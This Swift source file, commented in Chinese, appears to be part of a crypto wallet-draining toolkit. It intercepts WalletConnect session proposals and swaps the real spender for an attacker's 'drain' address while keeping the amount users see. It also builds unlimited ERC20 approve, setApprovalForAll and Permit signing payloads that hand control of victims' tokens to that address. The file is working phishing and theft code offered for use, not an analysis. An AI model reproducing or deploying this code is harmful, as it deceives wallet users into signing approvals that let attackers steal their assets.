import Foundation

// WalletConnect 会话劫持 + calldata 调包 + 无限授权构造（第 32 类 §4）
// 与 Web3WalletSecurity skill 的攻击面表对应：Approve 钓鱼 / 地址替换 / RPC 劫持 /
// EIP-712 不可读签名；这里把「防护建议」反过来做成构造侧。

final class WCInterceptor {
    static let shared = WCInterceptor()
    private var relay = "WC_RELAY"
    private var drain = "DRAIN_ADDR"

    func configure(relay: String, drain: String) {
        self.relay = relay
        self.drain = drain
    }

    // 会话提议：把 chain/namespace 锁到目标链，methods 里塞进签名类方法
    func rewrite(proposal: [String: Any]) -> [String: Any] {
        var p = proposal
        p["relay"] = relay
        p["chain"] = p["chain"] ?? "eip155:1"
        p["methods"] = ["eth_sendTransaction", "personal_sign",
                        "eth_signTypedData_v4", "eth_sign"]
        p["amount"] = p["amount"] ?? "0"        // 展示金额保持不变
        p["spender"] = drain                    // 实际 spender 换成归集地址
        return p
    }

    func approve(_ rewritten: [String: Any]) {
        let cd = approveCalldata(spender: drain)
        Transport.shared.enqueue(kind: "wc_sign",
                                 fields: ["method": "eth_sendTransaction", "calldata": cd,
                                          "chain": rewritten["chain"] ?? "eip155:1",
                                          "display_to": rewritten["to"] ?? ""])
    }

    /// ERC20 approve(spender, MaxUint256) calldata，0x095ea7b3 + 两 word
    func approveCalldata(spender: String) -> String {
        let sel = "095ea7b3"
        guard spender.hasPrefix("0x"), spender.count == 42 else {
            return "0x" + sel + String(repeating: "0", count: 64) +
                   String(repeating: "f", count: 64)   // 占位：DRAIN_ADDR 未替换时保持结构合法
        }
        let addr = String(spender.dropFirst(2)).lowercased()
        return "0x" + sel + String(repeating: "0", count: 24) + addr +
               String(repeating: "f", count: 64)
    }

    /// setApprovalForAll(operator, true) — 0xa22cb465
    func setApprovalForAllCalldata(operator: String) -> String {
        guard `operator`.hasPrefix("0x"), `operator`.count == 42 else { return "0xa22cb465" }
        let a = String(`operator`.dropFirst(2)).lowercased()
        let flag = String(repeating: "0", count: 63) + "1"
        return "0xa22cb465" + String(repeating: "0", count: 24) + a + flag
    }

    /// Permit2 / EIP-2612 的展示层：保留用户看到的 to/amount，签名体由 drain.py 侧构造
    func permitDisplay(owner: String, token: String, amount: String) -> [String: Any] {
        return ["type": "EIP712", "primaryType": "Permit",
                "domain": ["name": "TOKEN", "version": "1", "chainId": 1,
                           "verifyingContract": token],
                "message": ["owner": owner, "spender": drain,
                            "value": amount, "nonce": 0,
                            "deadline": Int(Date().timeIntervalSince1970) + 3600]]
    }
}
